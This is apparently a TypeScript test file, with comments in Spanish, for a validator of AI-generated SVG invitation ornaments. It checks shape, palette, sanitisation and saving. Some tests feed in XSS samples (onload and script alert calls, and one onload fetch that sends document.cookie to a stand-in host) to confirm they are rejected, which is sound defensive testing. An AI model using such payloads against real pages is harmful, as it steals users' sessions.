import test from "node:test";
import assert from "node:assert/strict";

import {
  aplicarArte,
  coloresDePaleta,
  hayArte,
  IDS_PIEZAS,
  PIEZAS_ARTE,
  piezaMeta,
  quitarPieza,
  validarPieza,
  validarPropuestas,
  sanearArteGuardado,
  type ArteInvitacion,
} from "@/lib/ia/arte";
import { PALETAS } from "@/config/diseno";

/**
 * EL ARTE A MEDIDA
 * =================
 * La aduana del SVG (pruebas/svg.prueba.ts) dice si el documento es
 * SEGURO. Esto dice si la pieza SIRVE: que tenga la forma del hueco, que
 * use la paleta de ESA invitación y que no sea un documento válido y
 * vacío — un adorno que pasa todas las validaciones y no se ve es el peor
 * resultado posible, porque nadie se entera.
 */

const PALETA = ["#d4af37", "#0b0b0c"];

const svgDe = (viewBox: string, trazos = 3) =>
  `<svg viewBox="${viewBox}">${'<path d="M1 1 L2 2" stroke="currentColor"/>'.repeat(trazos)}</svg>`;

test("el catálogo de piezas y sus ids no se pisan", () => {
  assert.deepEqual(IDS_PIEZAS, ["monograma", "divisor", "esquina"]);
  assert.equal(new Set(IDS_PIEZAS).size, PIEZAS_ARTE.length);
  assert.equal(piezaMeta("monograma")?.proporcion, 1);
  assert.equal(piezaMeta("inventada"), null);
});

test("una pieza buena pasa con su idea recortada", () => {
  const r = validarPieza(
    { pieza: "divisor", svg: svgDe("0 0 240 40"), idea: "x".repeat(400) },
    PALETA
  );
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.equal(r.pieza, "divisor");
    assert.equal(r.idea.length, 240, "la idea se recorta, no se guarda un ensayo");
  }
});

test("un divisor dibujado cuadrado se rechaza: descuadraría la invitación", () => {
  const r = validarPieza({ pieza: "divisor", svg: svgDe("0 0 100 100"), idea: "ok" }, PALETA);
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /forma no cuadra/);
});

test("una desviación pequeña de proporción sí se acepta", () => {
  // 240x42 es 5.71:1 contra 6:1 — un divisor, no un cuadro.
  const r = validarPieza({ pieza: "divisor", svg: svgDe("0 0 240 42"), idea: "ok" }, PALETA);
  assert.equal(r.ok, true, r.ok ? "" : r.motivo);
});

test("un documento válido y vacío NO pasa: sería un adorno invisible", () => {
  const r = validarPieza({ pieza: "esquina", svg: '<svg viewBox="0 0 80 80"></svg>', idea: "ok" }, PALETA);
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /no se vería/);
});

test("sin idea no pasa: el equipo tiene que poder elegir con criterio", () => {
  const r = validarPieza({ pieza: "esquina", svg: svgDe("0 0 80 80"), idea: "   " }, PALETA);
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /sin explicar/);
});

test("una pieza que no existe en el catálogo no pasa", () => {
  const r = validarPieza({ pieza: "fondo_completo", svg: svgDe("0 0 80 80"), idea: "ok" }, PALETA);
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /no existe/);
});

test("el ataque del SVG llega hasta aquí y también se para", () => {
  const r = validarPieza(
    {
      pieza: "esquina",
      svg: '<svg viewBox="0 0 80 80" onload="alert(1)"><path d="M0 0"/></svg>',
      idea: "ok",
    },
    PALETA
  );
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /Atributo no permitido/);
});

test("un color que no es de la paleta de esa invitación no pasa", () => {
  const svg = '<svg viewBox="0 0 80 80">' + '<path d="M1 1" fill="#ff00ff"/>'.repeat(3) + "</svg>";
  const r = validarPieza({ pieza: "esquina", svg, idea: "ok" }, PALETA);
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.motivo, /no está en la paleta/);
});

test("una pieza repetida en la tanda se queda con la primera", () => {
  const rs = validarPropuestas(
    [
      { pieza: "esquina", svg: svgDe("0 0 80 80"), idea: "la buena" },
      { pieza: "esquina", svg: svgDe("0 0 80 80"), idea: "la segunda" },
    ],
    PALETA
  );
  assert.equal(rs.length, 1);
  assert.equal(rs[0].ok && rs[0].idea, "la buena");
});

/* ---------- aplicar, quitar, contar ---------- */

test("aplicar una pieza no borra las que ya estaban", () => {
  const antes: ArteInvitacion = {
    version: 1,
    divisor: { svg: "<svg/>", idea: "el de la semana pasada", generadoEn: "2026-11-01" },
  };
  const despues = aplicarArte(
    antes,
    [{ ok: true, pieza: "monograma", svg: svgDe("0 0 120 120"), idea: "nuevo" }],
    "2026-11-26"
  );
  assert.equal(despues.divisor?.idea, "el de la semana pasada", "el divisor sigue ahí");
  assert.equal(despues.monograma?.idea, "nuevo");
  assert.equal(despues.monograma?.generadoEn, "2026-11-26");
});

test("una pieza rechazada no se aplica aunque venga en la tanda", () => {
  const despues = aplicarArte(
    null,
    [
      { ok: false, pieza: "monograma", motivo: "no" },
      { ok: true, pieza: "esquina", svg: svgDe("0 0 80 80"), idea: "sí" },
    ],
    "2026-11-26"
  );
  assert.equal(despues.monograma, undefined);
  assert.ok(despues.esquina);
});

test("quitar una pieza devuelve el ornamento de la plantilla", () => {
  const arte = aplicarArte(null, [{ ok: true, pieza: "divisor", svg: svgDe("0 0 240 40"), idea: "x" }], "hoy");
  assert.equal(hayArte(arte), true);
  const sin = quitarPieza(arte, "divisor");
  assert.equal(sin.divisor, undefined);
  assert.equal(hayArte(sin), false);
});

test("sin arte, hayArte dice que no (y no revienta con null)", () => {
  assert.equal(hayArte(null), false);
  assert.equal(hayArte(undefined), false);
  assert.equal(hayArte({ version: 1 }), false);
});

/* ---------- la paleta ---------- */

test("los colores salen de la paleta real, en minúsculas y con el acento delante", () => {
  const colores = coloresDePaleta(PALETAS.dorado_negro);
  assert.equal(colores[0], "#d4af37", "el acento va primero: es el color del adorno");
  assert.ok(colores.includes("#0b0b0c"));
  assert.ok(colores.every((c) => c === c.toLowerCase()));
});

test("toda paleta del catálogo da colores usables (ninguna se queda muda)", () => {
  for (const [id, paleta] of Object.entries(PALETAS)) {
    const colores = coloresDePaleta(paleta);
    assert.ok(colores.length >= 4, `la paleta ${id} solo dio ${colores.length} colores`);
  }
});

/* ---------- el guardado ---------- */

test("un SVG que nunca pasó la aduana NO se guarda, venga como venga", () => {
  // Esto es el ataque de verdad: la tarjeta del editor manda cosas
  // buenas, pero una acción de servidor se llama con lo que sea.
  const { arte, descartadas } = sanearArteGuardado({
    version: 1,
    monograma: {
      svg: '<svg viewBox="0 0 120 120" onload="fetch(\'https://ajeno.test?c=\'+document.cookie)"><path d="M0 0"/></svg>',
      idea: "parece inofensivo",
      generadoEn: "2026-11-26",
    },
  });
  assert.equal(arte, undefined, "no puede quedar nada guardado");
  assert.equal(descartadas.length, 1);
  assert.match(descartadas[0], /monograma: Atributo no permitido/);
});

test("al guardar, lo bueno se queda y lo malo se cae: pieza por pieza", () => {
  const { arte, descartadas } = sanearArteGuardado({
    version: 1,
    divisor: { svg: svgDe("0 0 240 40"), idea: "el bueno", generadoEn: "2026-11-26" },
    esquina: { svg: '<svg viewBox="0 0 80 80"><script>alert(1)</script></svg>', idea: "el malo" },
  });
  assert.ok(arte?.divisor, "el divisor bueno se guarda");
  assert.equal(arte?.esquina, undefined, "la esquina con script no");
  assert.equal(descartadas.length, 1);
});

test("el guardado no exige la paleta: cambiar de color no desarma la invitación", () => {
  // El adorno se dibujó con el oro de entonces. Si mañana el equipo
  // cambia la paleta, el ornamento que ya estaba puesto NO se borra solo.
  const svg = '<svg viewBox="0 0 240 40">' + '<path d="M1 1" fill="#d4af37"/>'.repeat(3) + "</svg>";
  const { arte, descartadas } = sanearArteGuardado({ version: 1, divisor: { svg, idea: "oro viejo" } });
  assert.ok(arte?.divisor);
  assert.deepEqual(descartadas, []);
});

test("basura en el campo arte no revienta el guardado", () => {
  assert.deepEqual(sanearArteGuardado(null), { arte: undefined, descartadas: [] });
  assert.deepEqual(sanearArteGuardado("<svg/>"), { arte: undefined, descartadas: [] });
  assert.deepEqual(sanearArteGuardado({ monograma: 42 }), { arte: undefined, descartadas: [] });
  assert.deepEqual(sanearArteGuardado({ otra_cosa: { svg: "<svg/>" } }), {
    arte: undefined,
    descartadas: [],
  });
});

test("una fecha de generación inventada se reemplaza, no se guarda", () => {
  const { arte } = sanearArteGuardado({
    version: 1,
    divisor: { svg: svgDe("0 0 240 40"), idea: "x", generadoEn: "y".repeat(500) },
  });
  assert.ok((arte?.divisor?.generadoEn ?? "").length < 40);
});

/* ---------- ¿aceptaría lo que un modelo escribe de verdad? ---------- */

/**
 * El riesgo opuesto al del ataque: una aduana tan estricta que rechace
 * TODO lo que el modelo escribe deja la función muerta al nacer, y cada
 * rechazo cuesta una generación entera. Estos tres son SVG escritos con
 * las costumbres reales de un modelo: xmlns, width/height de sobra,
 * decimales sin el cero delante, grupos, degradados con id, transform
 * con coma, notación científica en un trazado.
 */

const MONOGRAMA_REALISTA = `<svg xmlns="http://www.w3.org/2000/svg" width="240" height="240" viewBox="0 0 120 120">
  <defs>
    <linearGradient id="oro" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0" stop-color="#d4af37" stop-opacity=".9"/>
      <stop offset="1" stop-color="#f2d06b"/>
    </linearGradient>
  </defs>
  <circle cx="60" cy="60" r="52" fill="none" stroke="url(#oro)" stroke-width="1.2" opacity=".85"/>
  <g transform="translate(60,60) rotate(-4)" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
    <path d="M-24 18 L-24 -16 L-10 8 L4 -16 L4 18"/>
    <path d="M10 -16 L10 18 L26 18"/>
  </g>
  <path d="M60 4 C 67 12 67 20 60 26 C 53 20 53 12 60 4 Z" fill="currentColor" opacity=".7"/>
</svg>`;

const DIVISOR_REALISTA = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 40" fill="none">
  <path d="M8 20 H92" stroke="currentColor" stroke-width=".8" opacity=".6"/>
  <path d="M148 20 H232" stroke="currentColor" stroke-width=".8" opacity=".6"/>
  <path d="M98 20 C 106 9, 114 9, 120 20 C 126 31, 134 31, 142 20" stroke="currentColor" stroke-width="1.4"/>
  <path d="M120 14.5 l3.5 5.5 -3.5 5.5 -3.5 -5.5 z" fill="#d4af37"/>
  <circle cx="94" cy="20" r="1.5e0" fill="currentColor"/>
</svg>`;

const ESQUINA_REALISTA = `<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 80 80">
  <g stroke="currentColor" fill="none" stroke-linecap="round">
    <path d="M3 3 H36" stroke-width="1.3"/>
    <path d="M3 3 V36" stroke-width="1.3"/>
    <path d="M3 52 C 30 52, 52 30, 52 3" stroke-width=".9" opacity=".65" stroke-dasharray="3 2"/>
  </g>
  <path d="M18 22 C 28 14, 38 19, 35 30 C 26 34, 18 30, 18 22 Z" fill="currentColor" opacity=".5"/>
</svg>`;

test("el SVG que un modelo escribe de verdad PASA la aduana", () => {
  const reales = [
    { pieza: "monograma", svg: MONOGRAMA_REALISTA, idea: "Las iniciales entrelazadas bajo una hoja." },
    { pieza: "divisor", svg: DIVISOR_REALISTA, idea: "Dos trazos que se cruzan en un rombo." },
    { pieza: "esquina", svg: ESQUINA_REALISTA, idea: "Escuadra con hoja hacia dentro." },
  ];
  const resultados = validarPropuestas(reales, ["#d4af37", "#f2d06b", "#0b0b0c"]);
  for (const r of resultados) {
    assert.equal(r.ok, true, r.ok ? "" : `${r.pieza} rechazada: ${r.motivo}`);
  }
});

test("del SVG realista sobrevive el dibujo y se cae lo que sobra", () => {
  const r = validarPieza(
    { pieza: "monograma", svg: MONOGRAMA_REALISTA, idea: "x" },
    ["#d4af37", "#f2d06b"]
  );
  assert.equal(r.ok, true, r.ok ? "" : r.motivo);
  if (r.ok) {
    assert.ok(!/width="240"/.test(r.svg), "el tamaño de sobra se tira");
    assert.ok(r.svg.includes("url(#oro)"), "el degradado sobrevive");
    assert.ok(r.svg.includes("transform=\"translate(60,60) rotate(-4)\""), "la transformación sobrevive");
    assert.ok(r.svg.includes('stroke-width="2.2"'), "los decimales sobreviven");
  }
});
